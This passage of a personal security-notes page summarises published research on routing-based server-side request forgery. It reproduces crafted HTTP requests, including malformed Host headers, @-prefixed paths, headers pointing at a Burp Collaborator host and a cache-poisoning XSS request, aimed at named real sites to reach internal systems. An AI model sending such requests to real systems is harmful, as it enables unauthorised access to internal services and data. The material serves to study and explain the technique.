<div class="highlight-http notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="nf">GET</span> <span class="nn">/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span><span class="na">Host</span><span class="o">:</span> <span class="l">incapsula-client.net:80@burp-collaborator.net</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
</pre></div>
</div>
</div>
<div class="section" id="breaking-expectations">
<h3>11.31.3.6. Breaking expectations<a class="headerlink" href="#breaking-expectations" title="Permalink to this headline">¶</a></h3>
<p>The following request:</p>
<div class="highlight-http notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="nf">GET</span> <span class="nn">@burp-collaborator.net/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span><span class="na">Host</span><span class="o">:</span> <span class="l">newrelic.com</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
</pre></div>
</div>
<p>was changed to “<a class="reference external" href="http://public-backend&#64;burp-collaborator.net/">http://public-backend&#64;burp-collaborator.net/</a>” and sent to burp-collaborator.net. “As usual, this vulnerability gave me access to a huge amount of internal stuff, including both unauthenticated admin panels and mystifying in-jokes.”</p>
</div>
<div class="section" id="tunnels-tor2web">
<h3>11.31.3.7. Tunnels (Tor2web)<a class="headerlink" href="#tunnels-tor2web" title="Permalink to this headline">¶</a></h3>
<p><a class="reference external" href="https://www.globaleaks.org/">GlobaLeaks</a> is a whistleblowing site that uses <a class="reference external" href="https://tor2web.org/">Tor2web</a>:</p>
<blockquote>
<div><strong>WARNING:</strong> Tor2web only protects publishers, <em>not readers</em>. As a reader <a class="reference external" href="https://www.torproject.org/projects/torbrowser.html.en">installing Tor Browser</a> will give you much greater anonymity, confidentiality, and authentication than using Tor2web. Using Tor2web trades off security for convenience and usability.</div></blockquote>
<div class="admonition note">
<p class="first admonition-title">Note</p>
<p class="last">There’s another site <a class="reference external" href="http://globalleaks.com/">GlobalLeaks News</a> which automatically redirects to an HTTP web forum. A leaking platform using HTTP??? There is a <a class="reference external" href="http://globalleaks.com/memberlist.php">Memberlist</a> which returns a 404 Not Found error. A leaking platform having a members list??? And of course the <a class="reference external" href="http://globalleaks.com/memberlist.php">Search</a> and <a class="reference external" href="http://globalleaks.com/misc.php?action=help">FAQ</a> links both return a 404 Not Found error. There are associated YouTube, Facebook, and Twitter accounts. Who runs this website and for what purpose? Is it intended to be confused with GlobaLeaks?</p>
</div>
<p>From <a class="reference external" href="https://en.wikipedia.org/wiki/Tor2web">Wikipedia Tor2web</a>:</p>
<blockquote>
<div><strong>Tor2web</strong> is a software project to allow <a class="reference external" href="https://en.wikipedia.org/wiki/List_of_Tor_hidden_services">Tor hidden services</a> to be accessed from a standard browser without being connected to the Tor network.</div></blockquote>
<p>Rather than globaleaks.org being attacked directly via accessing internal services, it could be used as an attack platform. Using this request:</p>
<div class="highlight-http notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="nf">GET</span> <span class="nn">xyz.burpcollaborator.net:80/bar</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span><span class="na">Host</span><span class="o">:</span> <span class="l">demo.globaleaks.org</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
</pre></div>
</div>
<p>led to a flood of DNS requests:</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>xYZ.BurpcoLLABoRaTOR.neT.    from 89.234.157.254
Xyz.burPColLABorAToR.nET.    from 62.210.18.16
xYz.burpColLaBorATOR.net.    from 91.224.149.254
</pre></div>
</div>
<p>“Tor exit nodes use an obscure security mechanism to increase the security of DNS by randomizing the case of requests, and this mechanism was resulting in the Burp Collaborator server refusing to reply and thus triggering a flood of lookup attempts.”</p>
<p>“As all requests are routed through Tor, it can’t be abused to access any internal services.   That said, it’s an exceptionally powerful way to mask an attack on a third party, particular as since GlobaLeaks is a whistleblowing platform it probably doesn’t keep any logs and may end up being blamed for attacks. Additionally, the ability to make the webserver connect to a hostile site over Tor exposes a significant amount of attack surface.”</p>
</div>
</div>
<div class="section" id="targeting-auxiliary-systems">
<h2>11.31.4. Targeting auxiliary systems<a class="headerlink" href="#targeting-auxiliary-systems" title="Permalink to this headline">¶</a></h2>
<div class="section" id="getting-info-through-other-headers">
<h3>11.31.4.1. Getting info through other headers<a class="headerlink" href="#getting-info-through-other-headers" title="Permalink to this headline">¶</a></h3>
<p>Collaborator Everywhere makes requests like the following to induce pingbacks:</p>
<div class="highlight-http notranslate"><div class="highlight"><pre><span></span><span class="nf">GET</span> <span class="nn">/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">store.starbucks.ca</span>
<span class="hll"><span class="na">X-Forwarded-For</span><span class="o">:</span> <span class="l">a.burpcollaborator.net</span>
</span><span class="hll"><span class="na">True-Client-IP</span><span class="o">:</span> <span class="l">b.burpcollaborator.net</span>
</span><span class="hll"><span class="na">Referer</span><span class="o">:</span> <span class="l">http://c.burpcollaborator.net/</span>
</span><span class="hll"><span class="na">X-WAP-Profile</span><span class="o">:</span> <span class="l">http://d.burpcollaborator.net/wap.xml</span>
</span><span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
</pre></div>
</div>
<p>“X-Forwarded-For” can induce DNS lookups “but unless you have a convenient DNS library memory corruption vulnerability the callback behavior itself isn’t exploitable”.</p>
<p>“Referer” can result in not only a pingback but a complete crawl of the refering site. “This is effectively a blind SSRF vulnerability as there’s no way for the user to view the results of the analytics system’s request, and it often occurs minutes or hours after the user request, which further complicates exploitation.”</p>
<p>“X-Wap-Profile”:</p>
<blockquote>
<div>“Compliant applications will extract the URL from this header, then fetch and parse the specified XML document so they can tailor the content they supply to the client. This combination of two high risk pieces of functionality - fetching untrusted URLs and parsing untrusted XML - with obscure and easily-missed functionality seems ripe for exploitation. Unfortunately it’s not widely supported - Facebook was the only bug bounty site I could find that uses it, and they appear to be doing their XML parsing with due caution. They also only fetch the specified XML document roughly 26 hours after the request, making comprehensive iterative testing intensely impractical.”</div></blockquote>
</div>
<div class="section" id="remote-client-exploits">
<h3>11.31.4.2. Remote Client Exploits<a class="headerlink" href="#remote-client-exploits" title="Permalink to this headline">¶</a></h3>
<p>The article mentioned attackes against the pingback servers that did far more than download pages. The tool <a class="reference external" href="http://portswigger-labs.net/hackability/">Rendering Engine Hackability Probe</a> (code found at <a class="reference external" href="https://github.com/PortSwigger/hackability">PortSwigger/hackability</a>) which “performs a variety of tests to discover what the unknown rendering engine supports”. “As well as identifying common mishaps in custom browsers (like neglecting to enforce the Same Origin Policy) it flags unusual JavaScript properties.”</p>
<p>This could provide information for further exploits.</p>
</div>
<div class="section" id="pre-emptive-caching">
<h3>11.31.4.3. Pre-emptive Caching<a class="headerlink" href="#pre-emptive-caching" title="Permalink to this headline">¶</a></h3>
<p>The original author found a military server that cached some data in the request:</p>
<div class="highlight-http notranslate"><div class="highlight"><pre><span></span><span class="nf">GET</span> <span class="nn">/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">burpcollaborator.net</span>
</pre></div>
</div>
<p>A few seconds later the burpcollaborator.net host received these requests (apparently attempting to cache some values from an internal host):</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>GET /jquery.js HTTP/1.1
GET /abrams.jpg HTTP/1.1
</pre></div>
</div>
<p>So to steal some internal-only images:</p>
<div class="highlight-http notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="nf">POST</span> <span class="nn">/xss.cgi</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span><span class="na">Content-Length</span><span class="o">:</span> <span class="l">103</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>

<span class="hll">xss=&lt;img src=&quot;http://internal-server.mil/index.php/a.jpg&quot;/&gt;
</span></pre></div>
</div>
<p>The caching server would issue these caching requests:</p>
<div class="highlight-http notranslate"><div class="highlight"><pre><span></span><span class="nf">GET</span> <span class="nn">/index.php/a.jpg</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</pre></div>
</div>
<p>And the cached image could be retrieved via:</p>
<div class="highlight-http notranslate"><div class="highlight"><pre><span></span><span class="nf">GET</span> <span class="nn">/index.php/a.jpg</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">internal-server.mil</span>
</pre></div>
</div>
</div>
</div>
</div>


           </div>
           <div class="articleComments">
            
           </div>
          </div>
          <footer>
  
    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
      
        <a href="mitm.html" class="btn btn-neutral float-right" title="11.32. MitM Presentation" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
      
      
        <a href="20170819_presentation.html" class="btn btn-neutral" title="11.30. 2017-08-19 Forcing HTTPS, HTTP forwarding" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
      
    </div>
  

  <hr/>

  <div role="contentinfo">
    <p>
        &copy; Copyright 2017, bitbender.

    </p>
  </div>
  Built with <a href="http://sphinx-doc.org/">Sphinx</a> using a <a href="https://github.com/snide/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>. 

</footer>

        </div>
      </div>

    </section>

  </div>
  


  

    <script type="text/javascript">
        var DOCUMENTATION_OPTIONS = {
            URL_ROOT:'../',
            VERSION:'1.0.3',
            COLLAPSE_INDEX:false,
            FILE_SUFFIX:'.html',
            HAS_SOURCE:  true,
            SOURCELINK_SUFFIX: '.txt'
        };
    </script>
      <script type="text/javascript" src="../_static/jquery.js"></script>
      <script type="text/javascript" src="../_static/underscore.js"></script>
      <script type="text/javascript" src="../_static/doctools.js"></script>
      <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>

  

  
  
    <script type="text/javascript" src="../_static/js/theme.js"></script>
  

  
  
  <script type="text/javascript">
      jQuery(function () {
          SphinxRtdTheme.StickyNav.enable();
      });
  </script>
   

</body>
</html>